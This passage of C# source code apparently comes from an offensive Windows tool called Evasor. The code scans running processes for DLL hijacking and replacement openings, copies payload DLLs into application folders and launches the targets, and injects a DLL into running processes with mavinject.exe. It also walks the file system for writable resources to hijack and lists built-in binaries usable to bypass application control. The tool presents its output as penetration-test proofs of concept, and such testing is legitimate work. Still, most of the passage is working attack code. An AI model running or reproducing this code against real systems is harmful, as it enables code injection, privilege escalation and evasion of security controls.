                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    sub_Paths = list_of_injectable_process[processIndex].Split('^');
                    Process processs = new Process();
                    dll = @"\DLLs\cmd.dll";
                    processs.StartInfo.FileName = @"C:\Windows\System32\mavinject.exe";
                    processs.StartInfo.Arguments = " " + sub_Paths[1] + " /INJECTRUNNING " + PATH_OF_Evasor + dll;
                    processs.StartInfo.ErrorDialog = true;
                    processs.StartInfo.UseShellExecute = false;
                    processs.StartInfo.RedirectStandardOutput = true;
                    processs.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    Console.BackgroundColor = ConsoleColor.DarkGreen;
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("POC --> " + processs.StartInfo.FileName + processs.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + processs.StartInfo.FileName + processs.StartInfo.Arguments);
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Take a screen shot? (y/n)");
                    if (Console.ReadLine() == "y")
                    {
                        proof_Of_Concepts_Pictures.Add(take_screen_shot(Path.GetFileName(sub_Paths[0] + "_" + processIndex.ToString() + "_dll-injection.jpeg")));

                    }
                    Console.Write("To exit and return to main menu type ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("break");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine(" else press Enter....");
                    if (proof_Of_Concepts_Pictures.Count != 0)
                    {
                        //////////////////////////////////////////////////////////////////////////////////////////////////////////////
                        Report.Scan_Vulnerable_Process_To_DLL_Injection(list_of_injectable_process, proof_Of_Concepts, proof_Of_Concepts_Pictures);
                        //////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    }
                    if (Console.ReadLine() == "break")
                    {
                        break;
                    }
                }
                else
                {
                    dll = @"\DLLs\cmd.dll";
                    process.StartInfo.Arguments = " " + PATH_OF_Evasor + dll;
                    Console.WriteLine("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> " + process.StartInfo.FileName + process.StartInfo.Arguments);
                }
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Gray;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                Console.WriteLine("Take a screen shot? (y/n)");
                if (Console.ReadLine() == "y")
                {
                    proof_Of_Concepts_Pictures.Add(take_screen_shot(Path.GetFileName(list_of_available_executables_to_bypass_appControl[executableIndexToExecute] + "_" + executableIndexToExecute.ToString() + "_dll-Bypass.jpeg")));
                }
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("To exit and return to main menu type ");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("break");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine(" else press Enter....");
                if (proof_Of_Concepts_Pictures.Count != 0)
                {
                    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    Report.Scan_For_Executibles_That_Can_Bypass_Windows_AppControl(list_of_available_executables_to_bypass_appControl, proof_Of_Concepts, proof_Of_Concepts_Pictures);
                    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                }
                if (Console.ReadLine() == "break")
                {
                    break;
                }
            }
        }
        private static void console_DLL_Hijack_Bypass_prints()
        {
            List_Of_Hijckable_dlls = new List<string>();
            List_Of_Replaceble_dlls = new List<string>();
            dll = "";
            Scan_Process_Vulnerable_To_Dll_Hijack(dll);
            proof_Of_Concepts = new List<string>();
            proof_Of_Concepts_Pictures = new List<string>();
            while (true)
            {
                int i = 0;
                Console.WriteLine("Hijack the DLL? (y/n)");
                string poc = Console.ReadLine();
                if (poc == "y")
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    foreach (string str in List_Of_Hijckable_dlls)
                    {
                        Console.WriteLine(i.ToString() + "." + str);
                        i++;
                    }
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Enter one of the follwing DLL's (cmd.dll,x64.dll,x86.dll).");
                    dll = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Which DLL to Hijack? (0-" + (i - 1).ToString() + ")");
                    int dllIndex = int.Parse(Console.ReadLine());
                    sub_Paths = List_Of_Hijckable_dlls[dllIndex].Split('^');
                    System.IO.File.Copy(PATH_OF_Evasor + @"\DLLs\" + dll, sub_Paths[1]);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Type any key to run " + sub_Paths[0] + "!!!");
                    Console.ReadLine();
                    Process processs = new Process();
                    processs.StartInfo.FileName = sub_Paths[0];
                    processs.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                    Console.BackgroundColor = ConsoleColor.DarkGreen;
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("POC --> Copy " + PATH_OF_Evasor + @"\DLLs\" + dll + " To " + Path.GetDirectoryName(processs.StartInfo.FileName) + " rename it to the DLL you chose and execute " + processs.StartInfo.FileName + processs.StartInfo.Arguments);
                    proof_Of_Concepts.Add("POC --> Copy " + PATH_OF_Evasor + @"\DLLs\" + dll + " To " + Path.GetDirectoryName(processs.StartInfo.FileName) + " rename it to the DLL you chose and execute " + processs.StartInfo.FileName + processs.StartInfo.Arguments);
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Take a screen shot? (y/n)");
                    if (Console.ReadLine() == "y")
                    {
                        proof_Of_Concepts_Pictures.Add(take_screen_shot(Path.GetFileName(sub_Paths[0] + "_" + dllIndex.ToString() + "_dll-Hijack.jpeg")));
                    }
                    processs.WaitForExit();
                    File.Delete(sub_Paths[1]);
                }
                else
                {
                    Console.WriteLine("Replace the DLL? (y/n)");
                    poc = Console.ReadLine();
                    if (poc == "y")
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        foreach (string str in List_Of_Replaceble_dlls)
                        {
                            Console.WriteLine(i.ToString() + "." + str);
                            i++;
                        }
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Enter one of the follwing DLL's (cmd.dll,x64.dll,x86.dll).");
                        dll = Console.ReadLine();
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Which DLL to Replace? (0-" + (i - 1).ToString() + ")");
                        int dllIndex = int.Parse(Console.ReadLine());
                        sub_Paths = List_Of_Replaceble_dlls[dllIndex].Split('^');
                        System.IO.File.Move(sub_Paths[1], PATH_OF_Evasor + @"\BACKUP\temp.dll");
                        System.IO.File.Copy(PATH_OF_Evasor + @"\DLLs\" + dll, sub_Paths[1]);
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("___________________________________________________________________________________________________________________________________________");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Type any key to run " + sub_Paths[0] + "!!!");
                        Console.ReadLine();
                        Process processs = new Process();
                        processs.StartInfo.FileName = sub_Paths[0];
                        Console.BackgroundColor = ConsoleColor.DarkGreen;
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("POC --> Replace " + PATH_OF_Evasor + @"\DLLs\" + dll + " with " + sub_Paths[1] + " and execute " + processs.StartInfo.FileName + processs.StartInfo.Arguments);
                        proof_Of_Concepts.Add("POC --> Replace " + PATH_OF_Evasor + @"\DLLs\" + dll + " with " + sub_Paths[1] + " and execute " + processs.StartInfo.FileName + processs.StartInfo.Arguments);
                        Console.BackgroundColor = ConsoleColor.Black;
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Take a screen shot? (y/n)");
                        if (Console.ReadLine() == "y")
                        {
                            proof_Of_Concepts_Pictures.Add(take_screen_shot(Path.GetFileName(sub_Paths[0] + "_" + dllIndex.ToString() + "_dll-Replace.jpeg")));
                        }
                        processs.WaitForExit();
                        File.Delete(sub_Paths[1]);
                        System.IO.File.Move(PATH_OF_Evasor + @"\BACKUP\temp.dll", sub_Paths[1]);
                    }
                }
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("To exit and return to main menu type ");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("break");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine(" else press Enter....");
                if (proof_Of_Concepts_Pictures.Count != 0)
                {
                    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    Report.Scan_for_Process_vulnerable_to_DLL_hijack_DLL_replacement(List_Of_Hijckable_dlls, List_Of_Replaceble_dlls, proof_Of_Concepts, proof_Of_Concepts_Pictures);
                    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                }
                if (Console.ReadLine() == "break")
                {
                    break;
                }
            }
        }
        private static void console_Resources_Hijack_Bypass_prints()
        {
            List_Of_hijackble_resources = new List<string>();
            if (!File.Exists(PATH_OF_Evasor + @"\hijackble_respurces.txt"))
            {
                Scan_for_resource_hijacking();
            }
            else
            {
                System.IO.StreamReader file = new System.IO.StreamReader(@"hijackble_respurces.txt");
                string line;
                while ((line = file.ReadLine()) != null)
                {
                    List_Of_hijackble_resources.Add(line);
                }
            }

            foreach (string hijackableResource in List_Of_hijackble_resources)
            {
                try
                {
                    string can_hijack = string.Empty;
                    string subStr = System.IO.File.ReadAllText(hijackableResource);
                    string[] listStrLineElements = Regex.Split(subStr, "\n");
                    List<string> paths = new List<string>();
                    foreach (string resource in listStrLineElements)
                    {
                        foreach (string file in file_ends_and_starts)
                        {
                            if (resource.Contains("This program cannot be run in DOS mode"))
                            {
                                can_hijack += ".program ";
                                paths.Add("This program cannot be run in DOS mode ");
                            }
                            else
                            {
                                string resourceLower = resource.ToLower();
                                if (resourceLower.Contains(file))
                                {
                                    can_hijack += file + " ";
                                    paths.Add(resource + " ");
                                }
                            }
                        }
                    }
                    if (can_hijack != string.Empty)
                    {
                        try
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("________________________________________________________________________________________________________________________________________________________________________________________");
                            Console.ForegroundColor = ConsoleColor.Gray;
                            List<Process> listOfProcess = FileUtil.WhoIsLocking(hijackableResource);
                            Console.ForegroundColor = ConsoleColor.Green;
                            foreach (Process process in listOfProcess)
                            {
                                try
                                {
                                    string owner = GetProcessExtraInformation(process.Id);
                                    Console.WriteLine("_Process:{0} PID:{1} Owner:{2}", process.ProcessName, process.Id, owner);
                                    Console.WriteLine(@"\");
                                }
                                catch (Exception ex) { }
                            }
                            Console.ForegroundColor = ConsoleColor.Gray;
                        }
                        catch (Exception ex)
                        { }
                        Console.Write(" " + hijackableResource + " ");
                        Console.ForegroundColor = ConsoleColor.Green;
                        string new_can_hijack_string = string.Join(" ", can_hijack.Split(' ').Distinct());
                        var charsToRemove = new string[] { "<", ",", "\"", ">", "\n", "'", ")" };
                        foreach (var c in charsToRemove)
                        {
                            new_can_hijack_string = new_can_hijack_string.Replace(c, string.Empty);
                        }
                        new_can_hijack_string = string.Join(" ", new_can_hijack_string.Split(' ').Distinct());
                        Console.Write(new_can_hijack_string);
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine(" file path's can be hijacked !!!");
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        foreach (string resourcePath in paths)
                        {
                            if (!hijackableResource.Contains(".exe") && !hijackableResource.Contains(".dll") && !hijackableResource.Contains(".msi") && !hijackableResource.Contains(".lib") && !hijackableResource.Contains(".EXE")
                                && !hijackableResource.Contains(".DLL") && !hijackableResource.Contains(".MSI") && !hijackableResource.Contains(".LIB") || (hijackableResource.Contains(".log") || hijackableResource.Contains(".LOG")))
                            {
                                Console.Write(@"  \____");
                                Console.WriteLine(resourcePath);
                            }
                        }

                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                }
                catch (Exception ex) { }
            }
        }

        public static string OpenInerProcess(string filename, string command)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = false;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                Thread.Sleep(5);
                return output;
            }
            catch (Exception ex)
            {
                return string.Empty;
            }
        }

        private static void CreateFile(string filename, string content)
        {
            if (!File.Exists(filename))
            {
                using (var txtFile = File.AppendText(filename))
                {
                    txtFile.WriteLine(content);
                }
            }
        }

        private static void Scan_Process_Vulnerable_To_Dll_Hijack(string dll)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("_______________________________________________");
            Console.WriteLine("|Scanning for Process vulnerable to DLL Hijack!|");
            Console.WriteLine("|______________________________________________|");
            Console.ForegroundColor = ConsoleColor.Gray;
            try
            {
                Process[] processlist = Process.GetProcesses();

                Native n = new Native();

                foreach (Process theprocess in processlist)
                {
                    if (theprocess.ProcessName != Process.GetCurrentProcess().ProcessName && theprocess.ProcessName != Process.GetCurrentProcess().ProcessName+".vshost")
                    {
                        try
                        {
                            string ExePath = Path.GetDirectoryName(ProcessExecutablePath(theprocess));
                            List<string> files = new List<string>();

                            foreach (Module m in n.CollectModules(theprocess))
                            {
                                if (!File.Exists(ExePath + @"\" + m.ModuleName))
                                {
                                    try
                                    {
                                        if (m.ModuleName.Contains(".exe") || m.ModuleName.Contains(".EXE"))
                                        {
                                            Console.WriteLine("________________________________________________________________________________________________________________________________________________________________________________________");
                                            Console.WriteLine("|Process:{0} PID:{1} Owner:{2} Path:{3}", theprocess.ProcessName, theprocess.Id, GetProcessExtraInformation(theprocess.Id), ProcessExecutablePath(theprocess));
                                            Console.WriteLine("|_______________________________________________________________________________________________________________________________________________________________________________________|");
                                        }
                                        else
                                        {
                                            CreateFile(Process.GetCurrentProcess().ProcessName + ".txt", "Evasor");
                                            System.IO.File.Move(Path.GetFullPath(Process.GetCurrentProcess().ProcessName +".txt"), ExePath + @"\" + m.ModuleName);
                                            System.IO.File.Delete(ExePath + @"\" + m.ModuleName);
                                            Console.Write(m.ModuleName);
                                            Console.ForegroundColor = ConsoleColor.Green;
                                            Console.WriteLine(" Hijackable !!! ");
                                            Console.ForegroundColor = ConsoleColor.Gray;
                                            List_Of_Hijckable_dlls.Add(ProcessExecutablePath(theprocess) + "^" + ExePath + @"\" + m.ModuleName);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        if (m.ModuleName.Contains(".exe") || m.ModuleName.Contains(".EXE"))
                                        {
                                            Console.WriteLine("________________________________________________________________________________________________________________________________________________________________________________________");
                                            Console.WriteLine("|Process:{0} PID:{1} Owner:{2} Path:{3}", theprocess.ProcessName, theprocess.Id, GetProcessExtraInformation(theprocess.Id), ProcessExecutablePath(theprocess));
                                            Console.WriteLine("|_______________________________________________________________________________________________________________________________________________________________________________________|");
                                        }
                                        else
                                        {
                                            Console.ForegroundColor = ConsoleColor.Red;
                                            Console.WriteLine(m.ModuleName);
                                            Console.ForegroundColor = ConsoleColor.Gray;
                                        }
                                    }
                                }
                                else
                                {
                                    try
                                    {
                                        if (m.ModuleName.Contains(".exe") || m.ModuleName.Contains(".EXE"))
                                        {
                                            Console.WriteLine("________________________________________________________________________________________________________________________________________________________________________________________");
                                            Console.WriteLine("|Process:{0} PID:{1} Owner:{2} Path:{3}", theprocess.ProcessName, theprocess.Id, GetProcessExtraInformation(theprocess.Id), ProcessExecutablePath(theprocess));
                                            Console.WriteLine("|_______________________________________________________________________________________________________________________________________________________________________________________|");
                                        }
                                        else
                                        {
                                            System.IO.File.Move(ExePath + @"\" + m.ModuleName, ExePath + @"\" + "HIJACK" + m.ModuleName);
                                            System.IO.File.Move(ExePath + @"\" + "HIJACK" + m.ModuleName, ExePath + @"\" + m.ModuleName);
                                            Console.Write(m.ModuleName);
                                            Console.ForegroundColor = ConsoleColor.Cyan;
                                            Console.WriteLine(" Replacable !!!");
                                            Console.ForegroundColor = ConsoleColor.Gray;
                                            List_Of_Replaceble_dlls.Add(ProcessExecutablePath(theprocess) + "^" + ExePath + @"\" + m.ModuleName);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        if (m.ModuleName.Contains(".exe") || m.ModuleName.Contains(".EXE"))
                                        {
                                            Console.WriteLine("________________________________________________________________________________________________________________________________________________________________________________________");
                                            Console.WriteLine("|Process:{0} PID:{1} Owner:{2} Path:{3}", theprocess.ProcessName, theprocess.Id, GetProcessExtraInformation(theprocess.Id), ProcessExecutablePath(theprocess));
                                            Console.WriteLine("|_______________________________________________________________________________________________________________________________________________________________________________________|");
                                        }
                                        else
                                        {
                                            Console.ForegroundColor = ConsoleColor.Red;
                                            Console.WriteLine(m.ModuleName);
                                            Console.ForegroundColor = ConsoleColor.Gray;
                                        }
                                    }
                                }

                            }
                        }
                        catch (Exception ex)
                        { }
                    }
                }
            }
            catch (Exception ex)
            { }
        }
        private static void WalkDirectoryTree(System.IO.DirectoryInfo root)
        {
            System.IO.FileInfo[] files = null;
            System.IO.DirectoryInfo[] subDirs = null;

            // First, process all the files directly under this folder
            try
            {
                files = root.GetFiles("*.*");
            }
            // This is thrown if even one of the files requires permissions greater
            // than the application provides.
            catch (UnauthorizedAccessException e)
            {
                // This code just writes out the message and continues to recurse.
                // You may decide to do something different here. For example, you
                // can try to elevate your privileges and access the file again.
                log.Add(e.Message);
            }

            catch (System.IO.DirectoryNotFoundException e)
            {
                Console.WriteLine(e.Message);
            }

            if (files != null)
            {
                foreach (System.IO.FileInfo fi in files)
                {
                    // In this example, we only access the existing FileInfo object. If we
                    // want to open, delete or modify the file, then
                    // a try-catch block is required here to handle the case
                    // where the file has been deleted since the call to TraverseTree().
                    try
                    {
                        if (!fi.FullName.Contains(Process.GetCurrentProcess().ProcessName))
                        {
                            string filePath = System.IO.File.ReadAllText(fi.FullName);


                            if (isContains(filePath))
                            {
                                try
                                {
                                    string can_hijack = string.Empty;
                                    System.IO.File.Move(fi.FullName, Path.GetDirectoryName(fi.FullName) + @"\" + @"HIJACK" + Path.GetFileName(fi.FullName));
                                    System.IO.File.Move(Path.GetDirectoryName(fi.FullName) + @"\" + @"HIJACK" + Path.GetFileName(fi.FullName), fi.FullName);
                                    can_hijack = "Writable ";
                                    if (can_hijack != string.Empty)
                                    {
                                        Console.Write(fi.FullName + " ");
                                        using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"hijackble_respurces.txt", true))
                                        {
                                            file.WriteLine(fi.FullName);
                                        }
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.Write(can_hijack);
                                        Console.ForegroundColor = ConsoleColor.Gray;
                                        Console.WriteLine("file path's can be hijacked !!!");
                                        List_Of_hijackble_resources.Add((fi.FullName));
                                    }
                                }
                                catch (Exception ex)
                                { }
                            }
                        }
                    }
                    catch (Exception ex)
                    { }
                }

                // Now find all the subdirectories under this directory.
                subDirs = root.GetDirectories();

                foreach (System.IO.DirectoryInfo dirInfo in subDirs)
                {
                    // Resursive call for each subdirectory.
                    WalkDirectoryTree(dirInfo);
                }
            }
        }
        private static bool isContains(string i_Path)
        {
            foreach (string file_extention in file_extentions)
            {
                if (i_Path.Contains(file_extention) == true)
                {
                    return true;
                }
            }
            return false;
        }
        private static void printPremissiomns(Process i_process)
        {
            FileSecurity security = File.GetAccessControl(ProcessExecutablePath(i_process));
            AuthorizationRuleCollection acl = security.GetAccessRules(
               true, true, typeof(System.Security.Principal.NTAccount));
            foreach (FileSystemAccessRule ace in acl)
            {
                StringBuilder info = new StringBuilder();
                string line = string.Format("Account: {0}",
                   ace.IdentityReference.Value);
                info.AppendLine(line);
                Console.WriteLine(@"\___" + line);
                line = string.Format("Type: {0}", ace.AccessControlType);
                info.AppendLine(line);
                Console.WriteLine(@"       \___" + line);
                line = string.Format("Rights: {0}", ace.FileSystemRights);
                info.AppendLine(line);
                Console.WriteLine(@"        \___" + line);
                line = string.Format("Inherited ACE: {0}", ace.IsInherited);
                info.AppendLine(line);
                Console.WriteLine(@"         \___" + line);
                Console.WriteLine();
            }
        }
        private static string ProcessExecutablePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }

            return "";
        }
        private static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        private static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        private static int OpenProcessScan(string FileName, string Args)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = FileName;
                process.StartInfo.Arguments = Args;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();
                process.Kill();
                return process.ExitCode;
            }
            catch (Exception ex)
            {
                return 9;
            }
        }
        private static void search_for_executables_that_can_bypass_appControl()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("______________________________________________________________________");
            Console.WriteLine("|Scanning for executibles which can bypass AppControl rules");
            Console.WriteLine("|_____________________________________________________________________|");
            Console.ForegroundColor = ConsoleColor.Gray;

            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\regedit.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\at.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\at.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\reg.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\reg.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\cmd.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\cmd.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\winrm.cmd");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\winrm.cmd");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\cmstp.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\cmstp.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\Mshta.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\Mshta.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\control.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\control.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\Cscript.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\Cscript.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\Wscript.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\Wscript.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\msiexec.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\msiexec.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\regedit.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\regedit.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\regedt32.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\regedt32.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\Odbcconf.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\Odbcconf.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\SchTasks.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\SchTasks.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\forfiles.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\forfiles.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\regsvr32.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\regsvr32.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\rundll32.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\rundll32.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\ATBroker.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\ATBroker.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\wbem\wmic.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\wbem\wmic.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\Mavinject.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\Mavinject.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files\dotnet\dotnet.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\InfDefaultInstall.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\InfDefaultInstall.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Powershell.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Regasm.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Regasm.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Regsvc.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Regsvc.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\msbuild.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\Printing_Admin_Scripts\en-US\Pubprn.vbs");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\Pubprn.vbs");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\System32\WindowsPowerShell\v1.0\Powershell_ise.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Powershell_ise.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files (x86)\Microsoft SDKs\F#\4.0\Framework\v4.0\fsi.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools\Tracker.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files (x86)\Microsoft Visual Studio\2017\Enterprise\MSBuild\15.0\Bin\Tracker.exe");
